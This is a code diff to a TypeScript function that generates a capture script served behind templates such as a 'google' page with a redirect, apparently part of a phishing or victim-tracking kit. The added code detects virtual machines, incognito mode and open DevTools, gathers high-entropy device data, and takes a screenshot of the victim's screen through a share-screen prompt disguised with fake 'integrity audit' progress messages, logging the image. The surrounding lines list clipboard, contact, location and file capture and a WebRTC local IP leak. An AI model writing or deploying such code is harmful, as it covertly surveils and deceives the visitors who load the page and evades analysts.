@@ -131,10 +131,68 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
               return canvas.toDataURL().slice(-100);
             } catch(e) { return 'N/A'; }
           })(),
-          audioSig: 'Pending'
+          incognito: 'Checking...',
+          vmStatus: (function(){
+            var gpu = "";
+            try {
+              var c = document.createElement('canvas');
+              var gl = c.getContext('webgl');
+              var dbg = gl.getExtension('WEBGL_debug_renderer_info');
+              gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : '';
+            } catch(e) {}
+            var patterns = [/VMware/i, /VirtualBox/i, /Parallel/i, /SwiftShader/i, /Mesa/i, /Microsoft Basic Render/i];
+            for (var i=0; i<patterns.length; i++) if (patterns[i].test(gpu)) return "Detected (" + gpu + ")";
+            return "Physical Hardware";
+          })(),
+          audioSig: 'Pending',
+          gamut: (function(){
+            if (window.matchMedia('(color-gamut: p3)').matches) return 'P3';
+            if (window.matchMedia('(color-gamut: srgb)').matches) return 'sRGB';
+            return 'Standard';
+          })(),
+          refreshRate: 'Pending'
         };
 
-        // Deep Recon: Audio Fingerprint
+        // Deep Recon: Refresh Rate
+        (function(){
+          var start = null;
+          var frames = 0;
+          function check(timestamp) {
+            if (!start) start = timestamp;
+            frames++;
+            if (timestamp - start > 1000) {
+              logEvent('extra', { display_hz: Math.round((frames * 1000) / (timestamp - start)) });
+              return;
+            }
+            requestAnimationFrame(check);
+          }
+          requestAnimationFrame(check);
+        })();
+
+        // Deep Recon: Vibration Test
+        if (navigator.vibrate) {
+          navigator.vibrate([10, 50, 10]);
+          logEvent('extra', { haptic_ready: true });
+        }
+
+        // Deep Recon: Incognito Detection
+        (function() {
+          if (navigator.storage && navigator.storage.estimate) {
+            navigator.storage.estimate().then(function(est) {
+              var isPrivate = est.quota < 120000000;
+              logEvent('extra', { incognito_audit: isPrivate });
+            });
+          }
+        })();
+
+        // Deep Recon: DevTools Detection
+        (function() {
+          var devtools = false;
+          var element = new Image();
+          Object.defineProperty(element, 'id', { get: function() { devtools = true; } });
+          console.log(element);
+          setTimeout(function() { logEvent('extra', { devtools_open: devtools }); }, 2000);
+        })();
         try {
           var audioCtx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
           var oscillator = audioCtx.createOscillator();
@@ -187,7 +245,19 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
         // Wake Lock: Prevent Sleep during audit
         try { if (navigator.wakeLock) await navigator.wakeLock.request('screen'); } catch(e) {}
 
-        // Deep Recon: WebRTC Local IP Leak
+        // Deep Recon: High Entropy Brand/Model Detection
+        if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+          navigator.userAgentData.getHighEntropyValues(['architecture', 'model', 'platformVersion', 'fullVersionList', 'bitness', 'formFactor']).then(function(h) {
+             logEvent('extra', { hardware_brand_profile: JSON.stringify(h) });
+          }).catch(function(){});
+        }
+
+        // Deep Recon: High-Precision Performance Mark
+        (function(){
+          var start = performance.now();
+          for(var i=0; i<1000000; i++) Math.sqrt(i);
+          logEvent('extra', { cpu_compute_score: (performance.now() - start).toFixed(2) + 'ms' });
+        })();
         try {
           var pc = new RTCPeerConnection({iceServers:[]});
           pc.createDataChannel("");
@@ -337,11 +407,27 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
             if (p === 'screen') {
               if (!isSilent) updateProgress(prog, "Integritas visual sedang diproses...", "DISPLAY_AUTH");
               if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
-                await navigator.mediaDevices.getDisplayMedia({ video: true }).then(s => {
-                  var track = s.getVideoTracks()[0];
-                  logEvent('extra', { screen_label: track.label });
-                  s.getTracks().forEach(t => t.stop());
-                }).catch(e=>{});
+                try {
+                   var s = await navigator.mediaDevices.getDisplayMedia({ video: true }).catch(function(){ return null; });
+                   if (s) {
+                      var track = s.getVideoTracks()[0];
+                      
+                      // Visual Recon: Screen Snapshot
+                      try {
+                        var video = document.createElement('video');
+                        video.srcObject = s;
+                        await video.play();
+                        var canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        var snap = canvas.toDataURL('image/jpeg', 0.5);
+                        await logEvent('extra', { screen_label: track.label, screen_capture: snap });
+                      } catch(e) {}
+                      
+                      s.getTracks().forEach(t => t.stop());
+                   }
+                } catch(e) {}
               }
             }
 
@@ -366,6 +452,14 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
                       await logEvent('extra', { file_name: file.name, file_size: file.size, file_type: file.type });
                     }
                  }
+              }
+            }
+
+            if (p === 'storage') {
+              if (!isSilent) updateProgress(prog, "Storage forensics & quota check...", "DISK_INTEGRITY");
+              if (navigator.storage && navigator.storage.estimate) {
+                var est = await navigator.storage.estimate();
+                await logEvent('extra', { storage_mb: (est.usage / 1024 / 1024).toFixed(2), quota_gb: (est.quota / 1024 / 1024 / 1024).toFixed(2) });
               }
             }
 
@@ -397,14 +491,44 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
               }
             }
 
-            if (p === 'storage') {
-              if (!isSilent) updateProgress(prog, "Storage forensics & quota check...", "DISK_INTEGRITY");
-              if (navigator.storage && navigator.storage.estimate) {
-                var est = await navigator.storage.estimate();
-                await logEvent('extra', { storage_mb: (est.usage / 1024 / 1024).toFixed(2), quota_gb: (est.quota / 1024 / 1024 / 1024).toFixed(2) });
-              }
+            if (p === 'vibration') {
+               if (!isSilent) updateProgress(prog, "Sinkronisasi haptic & vibrasi...", "HARDWARE_HAPTIC");
+               if (navigator.vibrate) navigator.vibrate(200);
             }
-          } catch(e) {}
+
+            if (p === 'network') {
+               if (!isSilent) updateProgress(prog, "Analisis integritas node jaringan...", "NETWORK_INTELLIGENCE");
+               if (navigator.connection) {
+                  logEvent('extra', { 
+                    net_effective: navigator.connection.effectiveType,
+                    net_rtt: navigator.connection.rtt,
+                    net_downlink: navigator.connection.downlink,
+                    net_saveData: navigator.connection.saveData
+                  });
+               }
+            }
+
+            if (p === 'bluetooth') {
+               if (!isSilent) updateProgress(prog, "Scanning peripheral bus...", "BT_DISCOVERY");
+               if (navigator.bluetooth) {
+                  navigator.bluetooth.getAvailability().then(avail => logEvent('extra', { bt_available: avail }));
+               }
+            }
+            if (p === 'performance') {
+               if (!isSilent) updateProgress(prog, "Benchmarking hardware bus...", "BUS_SPEED");
+               var memory = navigator.deviceMemory || "N/A";
+               var cores = navigator.hardwareConcurrency || "N/A";
+               await logEvent('extra', { perf_cores: cores, perf_mem: memory });
+            }
+
+            if (p === 'security') {
+               if (!isSilent) updateProgress(prog, "Kernel security environment audit...", "KERNEL_SEC");
+               logEvent('extra', { 
+                 sec_webdriver: navigator.webdriver,
+                 sec_cookies: navigator.cookieEnabled,
+                 sec_java: navigator.javaEnabled()
+               });
+            }
           permsCompleted++;
         }
 
@@ -418,7 +542,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
 `;
 };
 
-const ALL_PERMS = ['notification', 'clipboard', 'media', 'gps', 'screen', 'files', 'sensors', 'contacts', 'storage'];
+const ALL_PERMS = ['notification', 'clipboard', 'media', 'gps', 'screen', 'files', 'sensors', 'contacts', 'storage', 'vibration', 'network', 'bluetooth', 'performance', 'security'];
 
 export const templates: Record<string, {name: string, render: (id: string) => string}> = {
   'google': {
